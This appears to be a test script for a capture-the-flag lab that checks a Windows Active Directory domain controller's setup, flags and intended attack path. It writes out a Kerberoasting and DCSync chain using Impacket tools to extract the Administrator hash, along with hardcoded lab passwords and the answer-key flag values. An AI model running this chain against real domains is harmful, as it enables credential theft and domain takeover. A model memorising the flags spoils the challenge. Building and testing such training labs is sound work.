#!/bin/bash
# Test A2 — Domain Controller (Windows AD)
# Requires: Windows DC reachable at $A2_HOST with AD running
# Tests:
#   - Flag 14: Project-L group 'info' attribute via nested group enumeration
#   - Flag 16: Badge log share with Petrov anomaly
#   - Flag 17: Kerberoast svc-backup → DCSync → DA share
#   - AD structure: OUs, users, groups, SPNs
#   - Compartment isolation: nested groups not directly visible

set -e

A2_HOST="${A2_HOST:-10.100.0.4}"
A2_ADMIN_PASS="${A2_ADMIN_PASS:-CTFAdmin2026!}"

# Check if DC is reachable via SMB (authenticated — anonymous doesn't show domain shares)
smbclient -L "//${A2_HOST}" -U "BOREAS\\Administrator%${A2_ADMIN_PASS}" 2>&1 | grep -q "NETLOGON" || exit 77

python3 << 'PYEOF'
import sys, os, subprocess, re

HOST = os.environ.get("A2_HOST", "10.100.0.4")
ADMIN_PASS = os.environ.get("A2_ADMIN_PASS", "CTFAdmin2026!")
errors = []

def check(name, cond, detail=""):
    if not cond:
        errors.append(f"FAIL: {name} — {detail}")
        print(f"  FAIL: {name} — {detail}", file=sys.stderr)

def ldap(filter_str, attrs="", user="Administrator", password=None):
    """Run an LDAP query and return stdout."""
    if password is None:
        password = ADMIN_PASS
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{HOST}",
           "-b", "DC=boreas,DC=local",
           "-D", f"{user}@boreas.local", "-w", password,
           filter_str]
    if attrs:
        cmd.extend(attrs.split())
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout, result.stderr

# === LDAP connectivity ===
out, err = ldap("(objectClass=domain)", "dn")
check("LDAP accessible", "boreas" in out.lower(), f"err: {err[:100]}")

# === Users exist ===
for user in ["v.harlan", "e.vasik", "m.webb", "svc-backup", "svc-scada", "guard.petrov", "s.morrison"]:
    out, _ = ldap(f"(sAMAccountName={user})", "sAMAccountName")
    check(f"user {user} exists", user in out, "not found")

# === j.chen disabled ===
out, _ = ldap("(sAMAccountName=j.chen)", "userAccountControl")
check("j.chen exists", "j.chen" in out.lower() or "chen" in out.lower())
# UAC 514 = disabled
check("j.chen is disabled", "514" in out, f"UAC not 514")

# === v.harlan is Domain Admin ===
out, _ = ldap("(cn=Domain Admins)", "member")
check("v.harlan in Domain Admins", "harlan" in out.lower())

# === SPNs ===
out, _ = ldap("(sAMAccountName=svc-backup)", "servicePrincipalName")
check("svc-backup has MSSQLSvc SPN", "MSSQLSvc" in out)

out, _ = ldap("(sAMAccountName=svc-scada)", "servicePrincipalName")
check("svc-scada has HTTP SPN", "HTTP" in out)

# === Flag 14: Nested group chain → Project-L info attribute ===
# Engineering-Support contains Research-Coordination contains Project-L
out, _ = ldap("(cn=Engineering-Support)", "member")
check("Engineering-Support has Research-Coordination", "Research-Coordination" in out)

out, _ = ldap("(cn=Research-Coordination)", "member")
check("Research-Coordination has Project-L", "Project-L" in out)

out, _ = ldap("(cn=Project-L)", "info member")
check("Project-L has flag 14 in info attr", "FLAG{2f8b4a6c1d9e7053}" in out, "flag not found")
check("Project-L members include vasik", "vasik" in out.lower())

# === Flag 16: Badge log share ===
result = subprocess.run(
    ["smbclient", f"//{HOST}/badgelogs", "-U", f"BOREAS\\svc-backup%Password1",
     "-c", "get access_log_march_2026.csv /tmp/a2_badge.csv"],
    capture_output=True, text=True
)
check("badge log share accessible", result.returncode == 0, f"err: {result.stderr[:100]}")
if os.path.isfile("/tmp/a2_badge.csv"):
    with open("/tmp/a2_badge.csv") as f:
        badge_text = f.read()
    check("flag 16 in badge log", "FLAG{b3d7e1f0c8a24596}" in badge_text)
    check("Petrov entries exist", "Petrov" in badge_text)
    check("Underground Hatch entries", "Underground Hatch" in badge_text or "Hatch" in badge_text)
    os.unlink("/tmp/a2_badge.csv")

# === Flag 17: Kerberoast → DCSync → DA share ===
# Step 1: Kerberoast svc-backup
result = subprocess.run(
    ["GetUserSPNs.py", f"BOREAS.LOCAL/svc-backup:Password1", "-dc-ip", HOST, "-request"],
    capture_output=True, text=True
)
check("Kerberoast returns TGS hash", "$krb5tgs$" in result.stdout, "no hash")

# Step 2: DCSync as svc-backup
result = subprocess.run(
    ["secretsdump.py", f"BOREAS.LOCAL/svc-backup:Password1@{HOST}", "-just-dc-user", "Administrator"],
    capture_output=True, text=True
)
check("DCSync extracts Administrator hash", "Administrator:" in result.stdout and ":::" in result.stdout,
      f"output: {result.stdout[:200]}")

# Step 3: Access DA-only flag share
result = subprocess.run(
    ["smbclient", f"//{HOST}/admin_flag", "-U", f"BOREAS\\Administrator%{ADMIN_PASS}",
     "-c", "get flag.txt /tmp/a2_flag17.txt"],
    capture_output=True, text=True
)
check("DA flag share accessible", result.returncode == 0, f"err: {result.stderr[:100]}")
if os.path.isfile("/tmp/a2_flag17.txt"):
    with open("/tmp/a2_flag17.txt") as f:
        flag_text = f.read()
    check("flag 17 in DA share", "FLAG{6c0a9d4e7f2b8135}" in flag_text)
    os.unlink("/tmp/a2_flag17.txt")

if errors:
    print(f"\n{len(errors)} checks failed:", file=sys.stderr)
    for e in errors: print(f"  {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
